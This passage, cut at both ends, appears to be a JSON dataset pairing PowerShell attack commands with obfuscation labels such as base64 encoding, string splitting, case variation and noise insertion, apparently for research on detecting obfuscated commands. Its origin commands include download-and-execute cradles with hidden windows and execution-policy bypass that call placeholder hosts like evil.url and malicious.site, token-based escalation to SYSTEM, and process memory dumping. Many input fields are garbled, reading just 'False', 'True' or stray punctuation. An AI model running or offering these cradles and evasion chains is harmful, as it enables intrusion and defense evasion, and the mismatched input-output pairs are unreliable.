    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Execute a PowerShell script file (template.ps1) with bypassing execution policy and without loading a user profile.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoProfile -File template.ps1"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ":: Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ": This is an attempt to simplify things and to: PowerShell a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ": Download and execute PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ":: Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ": This is an attempt to simplify things and to: PowerShell a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ": Download and execute PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ":: Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ": This is an attempt to simplify things and to: PowerShell a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ": Download and execute PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ":: Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ": This is an attempt to simplify things and to: PowerShell a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": ": Download and execute PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL with hidden window and bypassing execution policy.",
    "origin_cmd": "powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -WindowStyle Hidden -Command \"IEX (Invoke-WebRequest -Uri 'http://evil.url/evil.ps1').Content\""
  },
  {
    "input": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "output": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "True",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "True",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "True",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Create a new directory named \"staged\" in the current location and retrieve its full path.",
    "origin_cmd": "New-Item -Path \".\" -Name \"staged\" -ItemType \"directory\" -Force | foreach {$_.FullName} | Select-Object"
  },
  {
    "input": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "output": "Get-System -Technique Token",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "False",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "False",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "False",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "False",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "False",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "False",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "False",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "False",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Attempt to elevate privileges to SYSTEM using a technique related to tokens.",
    "origin_cmd": "Get-System -Technique Token"
  },
  {
    "input": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "output": "Out-Minidump -Process (Get-Process -Id 4293)",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "- (pt. 3) - Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": ".               .",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "Dumping of the memory of a specified process (ID 4293) with Out-Minidump.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "- (pt. 3) - Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": ".               .",
    "output": "cmd.vowels_to_ascii_tokens | Invoke-Expression (regex_decoder)",
    "label": "place holdder token",
    "obf_category": "Token Substitution",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "Dumping of the memory of a specified process (ID 4293) with Out-Minidump.",
    "output": "phd_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "place holder token and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "output": "cmd.swap_pairs | powershell_decoder_script",
    "label": "swap",
    "obf_category": "String Manipulation",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "- (pt. 3) - Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "output": "swap_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "swap and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": ".               .",
    "output": "cmd.insert_char('`t') | Invoke-Expression (string_replace('`t',''))",
    "label": "noise token insertion (whitespace)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "Dumping of the memory of a specified process (ID 4293) with Out-Minidump.",
    "output": "whitespace_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (whitespace) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "output": "cmd.insert_char('`n') | Invoke-Expression (string_replace('`n',''))",
    "label": "noise token insertion (endline)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "- (pt. 3) - Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "output": "endline_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (endline) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": ".               .",
    "output": "cmd.insert_char('@') | Invoke-Expression (string_replace('@',''))",
    "label": "noise token insertion (atsign)",
    "obf_category": "Noise Injection",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "Dumping of the memory of a specified process (ID 4293) with Out-Minidump.",
    "output": "atsign_decoder_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "noise token insertion (atsign) and base64",
    "obf_category": "Encoding",
    "origin_nl": "Dump the memory of a specified process (ID 4293) using Out-Minidump.",
    "origin_cmd": "Out-Minidump -Process (Get-Process -Id 4293)"
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\"",
    "label": "origin",
    "obf_category": "Clean",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": This is the complete paraphrase: Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": I believe that this is the best way to This: Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "cmd.split_by(2).join_with(\"'+'\").Invoke_Expression",
    "label": "split",
    "obf_category": "String Manipulation",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "split_join_script.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "split and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "cmd.random_case_variation",
    "label": "case variation",
    "obf_category": "Token Substitution",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
    "input": ": This is the complete paraphrase: Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "output": "case_variation_cmd.encode('utf-16le') | base64.b64encode | powershell -enc",
    "label": "case variation and base64",
    "obf_category": "Encoding",
    "origin_nl": "Download and execute a PowerShell script from a remote URL using Invoke-WebRequest and Invoke-Expression.",
    "origin_cmd": "Invoke-Expression -Command \"& {Invoke-WebRequest http://malicious.site/malicious.ps1 | Invoke-Expression}\""
  },
  {
